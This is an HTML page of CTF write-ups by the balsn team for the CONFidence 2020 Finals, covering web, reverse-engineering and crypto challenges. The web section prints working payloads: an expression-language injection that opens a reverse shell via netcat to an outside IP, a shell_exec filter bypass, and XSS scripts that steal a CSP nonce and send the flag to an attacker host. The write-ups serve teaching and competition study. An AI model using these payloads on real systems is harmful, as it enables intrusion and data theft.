@@ -1,0 +1,426 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>CONFidence 2020 CTF Finals</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#password-manager">password-manager</a>
+    
+                <a class="dropdown-item" href="#haha-jail">haha-jail</a>
+    
+                <a class="dropdown-item" href="#yet-another-cat-challenge">yet-another-cat-challenge</a>
+    
+                <a class="dropdown-item" href="#yet-another-yet-another-cat-challenge">yet-another-yet-another-cat-challenge</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                reverse
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#team-trees">team-trees</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#fibhash">fibhash</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#password-manager" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">password-manager</span>
+            </a>
+    
+<a href="#haha-jail" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">haha-jail</span>
+            </a>
+    
+<a href="#yet-another-cat-challenge" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">yet-another-cat-challenge</span>
+            </a>
+    
+<a href="#yet-another-yet-another-cat-challenge" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">yet-another-yet-another-cat-challenge</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">reverse</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#team-trees" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">team-trees</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#fibhash" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">fibhash</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="confidence-2020-ctf-finals"><a class="header-link" href="#confidence-2020-ctf-finals"></a>CONFidence 2020 CTF Finals</h1>
+
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="password-manager"><a class="header-link" href="#password-manager"></a>Password Manager</h3>
+<p>This blackbox challenge has only one input box. After some fuzzing @how2hack found the input <code>${7*7}</code> will return 49.</p>
+<p>Based on <code>JSESSIONID</code>, we know this is a Java application. After some trial and error, we google the error message and find it&#39;s <code>Java Unified Expression Language</code>.</p>
+<pre class="hljs"><code>&gt; ${context}
+
+de<span class="hljs-selector-class">.odysseus</span><span class="hljs-selector-class">.el</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.SimpleContext</span>@<span class="hljs-number">5</span>bd317d3
+</code></pre><p><a href="https://pulsesecurity.co.nz/articles/EL-Injection-WAF-Bypass">This articile</a> demos how to RCE through this template injection.</p>
+<p>Here is the final RCE payload:</p>
+<pre class="hljs"><code>${true.getClass().forName(<span class="hljs-string">"java.lang.Runtime"</span>).getMethods()[<span class="hljs-number">6</span>].invoke(true.getClass().forName(<span class="hljs-string">"java.lang.Runtime"</span>)).exec(<span class="hljs-string">"busybox nc 133.221.333.123 1337 -e sh"</span>)}<span class="hljs-comment">";</span>
+
+# p4{inside-jar-was-juel-who-blocked-my-classes-<span class="hljs-built_in">and</span>-made-<span class="hljs-keyword">me</span>-use-session-giving-<span class="hljs-keyword">me</span>-depression}</code></pre><h3 id="haha-jail"><a class="header-link" href="#haha-jail"></a>HAHA Jail</h3>
+<p>The server uses <a href="https://github.com/facebook/hhvm">hhvm</a> to run the php sandbox. Here is a simple hello world sample:</p>
+<pre class="hljs"><code><span class="php"><span class="hljs-meta">&lt;?</span>hh
+&lt;&lt;__EntryPoint&gt;&gt;
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>: <span class="hljs-title">void</span> </span>{
+<span class="hljs-keyword">echo</span> <span class="hljs-number">123</span>;
+}</span></code></pre><p>The server also has a lots of keyword filter. For instance, the source code cannot contain <code>shell_exec</code>. However this is trivial to bypass as PHP is a pretty dynamic language.</p>
+<pre class="hljs"><code><span class="php"><span class="hljs-meta">&lt;?</span>hh                                                                                                                                     
+&lt;&lt;__EntryPoint&gt;&gt;                                                                                                                         
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>: <span class="hljs-title">void</span> </span>{
+  <span class="hljs-keyword">echo</span> call_user_func(<span class="hljs-string">"shell_\x65xec"</span>,<span class="hljs-string">"cat \x2fvar\x2fwww\x2f*lag* 1&gt;&amp;2"</span>);
+}</span></code></pre><p>Flag: <code>p4{h4x0riN9_7H3_H4ck}</code></p>
+<h3 id="yet-another-cat-challenge"><a class="header-link" href="#yet-another-cat-challenge"></a>Yet Another Cat Challenge</h3>
+<p>This is a XSS challenge and flag is in <code>/flag</code> (JSONP script endpoint). However, strict CSP is deployed:</p>
+<pre class="hljs"><code>default-src <span class="hljs-string">'none'</span>; form-action <span class="hljs-string">'self'</span>; frame-ancestors <span class="hljs-string">'none'</span>; style-src https:<span class="hljs-regexp">//</span>stackpath.bootstrapcdn.com<span class="hljs-regexp">/bootstrap/</span><span class="hljs-number">4.5</span>.<span class="hljs-number">2</span><span class="hljs-regexp">/css/</span>bootstrap.min.css; img-src <span class="hljs-string">'self'</span>; script-src <span class="hljs-string">'nonce-GXj7n92IV_gjalKGExKGCg'</span> https:<span class="hljs-regexp">//</span>www.google.com<span class="hljs-regexp">/recaptcha/</span> https:<span class="hljs-regexp">//</span>www.gstatic.com<span class="hljs-regexp">/recaptcha/</span>; frame-src https:<span class="hljs-regexp">//</span>www.google.com<span class="hljs-regexp">/recaptcha/</span></code></pre><p>So we cannot just <code>fecth(&quot;/flag&quot;)</code> and read the content. We have to somehow inject <code>&lt;script src=&quot;/flag&quot;&gt;</code> with valid nonce.</p>
+<p>On one of the page, we have an XSS endpoint. The payload is inside <code>&lt;script&gt;</code> block so we don&#39;t have to worry about nonce.</p>
+<p>We just retrieve the nonce through <code>document.querySelector(&quot;script&quot;).nonce;</code> and use <code>document.write</code> to load the flag.</p>
+<p>The attack steps:</p>
+<ol class="list">
+<li>Redirect admin to our page using <code>&lt;/script&gt;&lt;meta http-equiv=&quot;refresh&quot; content=...</code></li>
+<li>Redirect admin to the DOM XSS page <code>note/UUID?theme=XSS_PAYLOAD</code></li>
+<li>Retrieve the nonce and load the flag</li>
+<li>Javascript redirection <code>location=</code> the exfiltrate the flag</li>
+</ol>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode
+<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">replace</span><span class="hljs-params">(x)</span>:</span>
+    <span class="hljs-keyword">for</span> old, new <span class="hljs-keyword">in</span> [
+        (<span class="hljs-string">'"'</span>, <span class="hljs-string">'\\x22'</span>),
+        (<span class="hljs-string">'&lt;'</span>, <span class="hljs-string">'\\x3c'</span>),
+        (<span class="hljs-string">'&gt;'</span>, <span class="hljs-string">'\\x3e'</span>),
+        (<span class="hljs-string">'\n'</span>, <span class="hljs-string">''</span>),
+        ]:
+        x = x.replace(old, new)
+    <span class="hljs-keyword">return</span> x
+payload = quote(replace(<span class="hljs-string">'''
+nonce=document.querySelector(`script`).nonce;
+document.write(`&lt;script nonce="${nonce}" src="/flag?var=flag"&gt;&lt;/script&gt;
+&lt;script nonce="${nonce}"&gt;location="//133.221.333.123:1337/flag.html?"+btoa(flag)&lt;/script&gt;`);
+'''</span>))
+redirect_url = <span class="hljs-string">'http://yacc.zajebistyc.tf/note/b02e8d7d-be2a-455d-8eeb-2d0db6194a95?theme='</span> + payload
+print(redirect_url)
+
+<span class="hljs-comment"># cat type payload</span>
+print(f<span class="hljs-string">'&lt;/script&gt;&lt;meta http-equiv="refresh" content="0;url=http://133.221.333.123:1337" /&gt;'</span>.replace(<span class="hljs-string">'"'</span>, <span class="hljs-string">'&amp;quot;'</span>))
+<span class="hljs-comment"># index.html</span>
+f<span class="hljs-string">'''
+location = '{redirect_url}'
+'''</span></code></pre><p>Flag: <code>p4{you_painted_it_yourself!}</code></p>
+<p>This is apparently an unintended solution. Another unintended solution is using <code>window.open</code>. See <a href="https://gist.github.com/terjanq/a50aa6a3b78fbc4350e5a14e2ff0a7d8">@terjanq&#39;s payload</a> for details. Both solution does not exploit through the flag JSONP API.</p>
+<p>The intended solution, according to XeR, is using BMP to leak the pixels, as the CSP allows to include images from <code>self</code>.</p>
+<pre class="hljs"><code>http://yayacc.zajebistyc.tf/flag?var=<span class="hljs-symbol">%42</span><span class="hljs-symbol">%4</span>D<span class="hljs-symbol">%50</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%0</span>C<span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%08</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%00</span><span class="hljs-symbol">%01</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%01</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%00</span></code></pre><p>And use <code>&lt;img&gt;</code> to load the flag and leak it.</p>
+<h3 id="yet-another-yet-another-cat-challenge"><a class="header-link" href="#yet-another-yet-another-cat-challenge"></a>Yet Another Yet Another Cat Challenge</h3>
+<p>This is a fixed version of the previous challenge by removing the script element <code>document.scripts[0].remove()</code>. We can no longer retrieve the nonce.</p>
+<p>However, violating CSP will fire an event <a href="https://developer.mozilla.org/en-US/docs/Web/API/SecurityPolicyViolationEvent">SecurityPolicyViolationEvent</a>, which can be useful to retrieve the nonce.</p>
+<p>The attack steps are exactly the same as the previous challenge.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode
+<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">replace</span><span class="hljs-params">(x)</span>:</span>
+    <span class="hljs-keyword">for</span> old, new <span class="hljs-keyword">in</span> [
+        (<span class="hljs-string">'"'</span>, <span class="hljs-string">'\\x22'</span>),
+        (<span class="hljs-string">'&lt;'</span>, <span class="hljs-string">'\\x3c'</span>),
+        (<span class="hljs-string">'&gt;'</span>, <span class="hljs-string">'\\x3e'</span>),
+        (<span class="hljs-string">'\n'</span>, <span class="hljs-string">''</span>),
+        ]:
+        x = x.replace(old, new)
+    <span class="hljs-keyword">return</span> x
+payload = quote(replace(<span class="hljs-string">'''
+document.addEventListener(`securitypolicyviolation`, function (e) {
+  nonce=e.originalPolicy.substring(182, 204);
+  document.write(`&lt;script nonce="${nonce}" src="/flag?var=flag"&gt;&lt;/script&gt;&lt;script nonce="${nonce}"&gt;location="//133.221.333.123:1337/flag222.html?"+btoa(flag)&lt;/script&gt;`);
+});
+fetch(`foo`)
+'''</span>))
+redirect_url = <span class="hljs-string">'http://yayacc.zajebistyc.tf/note/6fadeb7c-b5cc-426c-b7dc-92a7cba5fdd7?theme='</span> + payload
+print(redirect_url)
+
+<span class="hljs-comment"># cat type payload</span>
+print(f<span class="hljs-string">'&lt;/script&gt;&lt;meta http-equiv="refresh" content="0;url=http://133.221.333.123:1337" /&gt;'</span>.replace(<span class="hljs-string">'"'</span>, <span class="hljs-string">'&amp;quot;'</span>))
+<span class="hljs-comment"># index.html</span>
+f<span class="hljs-string">'''
+location = '{redirect_url}'
+'''</span></code></pre><p>Flag: <code>p4{can_you_draw_with_a_cat?}</code></p>
+<p>For the intended solution, please refer to the previous challenge&#39;s write-up.</p>
+<h2 id="reverse"><a class="header-link" href="#reverse"></a>Reverse</h2>
+<h3 id="team-trees"><a class="header-link" href="#team-trees"></a>Team Trees</h3>
+<pre class="hljs"><code><span class="hljs-comment"># sage ./flag.sage</span>
+
+<span class="hljs-comment"># p4{62246322232ceabf0bf1d9826c054007}</span>
+
+<span class="hljs-string">'''
+loop:
+    lea     rdx, [rdx+rdx*2]
+    lea     rdx, [rdx+rcx*2+4]
+    xchg    rcx, rdx
+    jmp     loop
+
+
+x' = y
+y' = 3x + 2y + 4
+
+[ x , y , 1 ]
+
+[ 0 , 3 , 0 ]
+[ 1 , 2 , 0 ]
+[ 0 , 4 , 1 ]
+'''</span>
+
+
+K = Zmod(<span class="hljs-number">2</span>^<span class="hljs-number">64</span>)
+
+A = Matrix(K, [
+    [ <span class="hljs-number">0x82F96AC97429A68B</span>, <span class="hljs-number">0x32B9B6BCA55548ED</span>, <span class="hljs-number">1</span>]
+])
+
+N = Matrix(K, [
+    [ <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>],
+    [ <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>],
+    [ <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>],
+])
+
+<span class="hljs-keyword">assert</span> N^(<span class="hljs-number">2</span>^<span class="hljs-number">64</span>) == identity_matrix(<span class="hljs-number">3</span>)
+
+
+dp = [<span class="hljs-number">0</span>] * <span class="hljs-number">1338</span>
+dp[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>
+dp[<span class="hljs-number">1</span>] = <span class="hljs-number">3</span>
+dp[<span class="hljs-number">2</span>] = <span class="hljs-number">5</span>
+dp[<span class="hljs-number">3</span>] = <span class="hljs-number">15</span>
+
+K = Zmod(<span class="hljs-number">2</span>^<span class="hljs-number">66</span>)
+dp = [K(e) <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> dp]
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range( <span class="hljs-number">1338</span> ):
+    <span class="hljs-keyword">if</span> dp[i]:
+        <span class="hljs-keyword">continue</span>
+
+    dp[i] = dp[i<span class="hljs-number">-1</span>] + dp[i<span class="hljs-number">-2</span>] ** <span class="hljs-number">2</span> + dp[i<span class="hljs-number">-3</span>] ** <span class="hljs-number">3</span>
+    <span class="hljs-comment">#print(i, dp[i])</span>
+
+n = dp[<span class="hljs-number">1337</span>]
+e = ZZ(n) // <span class="hljs-number">4</span>
+
+print( <span class="hljs-string">'n ='</span> , n )
+print( <span class="hljs-string">'n / 4 ='</span> , e )
+print( <span class="hljs-string">'n % 4 ='</span> , n % <span class="hljs-number">4</span> ) <span class="hljs-comment"># 1</span>
+
+ans = A*N^e
+print( <span class="hljs-string">'A * N^e ='</span> , ans)
+
+rdx = ans[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]
+rcx = ans[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>]
+
+rdx = rdx + rdx * <span class="hljs-number">2</span>
+
+print( <span class="hljs-string">'p4{%016x%016x}'</span> % ( rcx , rdx )  )</code></pre><h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
+<h3 id="fibhash"><a class="header-link" href="#fibhash"></a>FibHash</h3>
+<p>Given a big prime $p$, indicates all scalar arithmetic will be performed under modulo $p$.
+Given four matrices $A_0$..$A_3$, and four vectors $x_0$..$x_3$.
+Given $A_i^nx_i[0]$, find $n$.</p>
+<p>First, observe the eigen values of each matrix.
+Eigen value of $A_0$ is a multiple root $3$, and $A_0$ is not diagnalizable.
+Eigen values of $A_1$, $A_2$, and $A_3$ are $(3, 5)$, $(5, 7)$ and $(3, 7)$, respectively.</p>
+<p>By diagnalizing $A_1$, $A_2$, $A_3$ and solving simultaneous equations, we can calculate $3^n$, $5^n$, and $7^n$.
+Note that $A_0^n =\begin{matrix}
+|&amp;3^n\times n+3^n&amp;-3^n\times n&amp;| \
+|&amp;3^{n-1}\times n&amp;-3^n\times n+3^n&amp;|
+\end{matrix}$
+Since $3^n$ is calculated before, one can easily find $n$.</p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
